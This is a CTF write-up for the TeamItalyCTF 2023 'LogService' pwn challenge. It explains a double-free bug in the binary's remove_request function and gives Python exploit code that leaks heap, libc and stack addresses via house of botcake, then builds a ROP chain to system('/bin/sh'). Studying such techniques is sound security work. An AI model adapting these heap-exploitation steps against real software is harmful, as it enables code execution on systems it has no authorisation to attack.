# TeamItalyCTF 2023

## [pwn] LogService (13 solves)
Log requests and save it with this fast and safe Log server

This is a remote challenge, you can connect with:

nc log.challs.teamitaly.eu 29006

Author: Riccardo Sulis <@ricchi24>

## Analyzing the binary

the program is simple, allows to add, remove, view and save requests like any standard heap challenge. 

By analyzing the "remove_request" function we can see the bug that allows to duplicate a pointer in the array it remains accessible because n_requests isn't decremented.
```
void __fastcall remove_request()
{
  unsigned int ptr; // [rsp+0h] [rbp-10h] BYREF
  int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fread(&ptr, 4uLL, 1uLL, stdin);
  if ( ptr < n_requests )
  {
    free(*((void **)requests + ptr));
    for ( i = ptr; i < n_requests - 1; ++i )
      *((_QWORD *)requests + i) = *((_QWORD *)requests + i + 1);
    send_message(0LL, 2LL, "OK");
  }
  else
  {
    send_message(1LL, 11LL, "invalid idx");
  }
}
```

we can notice it in gdb too by adding 3 requests and remove the first one.
```
pwndbg> x/3gx 0x55da9e164330
0x55da9e164330: 0x000055da9e164370      0x000055da9e164400
0x55da9e164340: 0x000055da9e164400
pwndbg> 
```

## Exploiting the bug
To exploit the double free there are 2 ways "fastbin attack" or "house of botcake", i prefer the last one because is stronger.
first of all i leaked heap then exploited `house of botcake` and leaked libc too.
```py
add_request(0x80, b"a"*0x80)
add_request(0x80, b"a"*0x80)
remove(0)
remove(0)
heap = decrypt(u64(show(0)[:8])) - 0x2a0
#print(hex(heap))
for i in range(12):
    add_request(0x100, b"a"*0x100)


for i in range(7):
    remove(5)

remove(13)
lib = u64(show(13)[:8])-0x219ce0
libc.address = lib
#print(hex(lib))

remove(5)
add_request(0x100, b"a"*0x100)
remove(13)
```

here there again 2 ways to exploit: angry fsrop or leaking stack to rop.
I went for the second one.
Leaking stack is a bit hard because you can't just allocate on `environ` and read it but you have to allocate on array of buffer write the pointer and then use `show` function.

```
k = (heap + 0x11b0)>>12 # key
chunks = heap + 0x1560-0x90 # array of buffer
big_chunk = heap + 0x10f0 # overlapping chunk
victim_chunk = heap + 0x11b0 # overlapped chunk

payload = cyclic(0xb0) + p64(0) + p64(0x111) # size
payload += p64((chunks)^k) # fwd
payload += b"A"*(0x1c0-len(payload)) # offset
add_request(0x1c0, payload)
#print(hex(big_chunk))

add_request(0x100, b"a"*0x100)

payload = b"\x00"*0x88 #offset
payload += p64(0xa1) # size 
# buffer i need
payload += p64(libc.sym["environ"]) 
payload += p64(big_chunk)
payload += p64(big_chunk)
payload += p64(victim_chunk)
payload += b"A"*(0x100-len(payload)) # offset
add_request(0x200, b"a"*0x200) # this is to don't reallocate array while writing on it 
add_request(0x100, payload)

stack = u64(show(0)[:8])
```

Now i only need to repeat exploit to allocate a chunk on the stack and rop. To exploit again i free the overlapping chunks and reallocate them.
```
rbp = stack-0x148
payload = cyclic(0xb0) + p64(0) + p64(0x111)
payload += p64((rbp)^k)# fwd
payload += b"A"*(0x1c0-len(payload))
add_request(0x1c0, payload)
add_request(0x100, b"a"*0x100)
rop = ROP(libc)
chain = p64(rop.ret.address) + p64(rop.rdi.address) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym["system"])
chain += b"a"*(0x100-8-len(chain))
add_request(0x100, b"a"*8+chain)

sl(b"cat flag")

io.interactive()
```
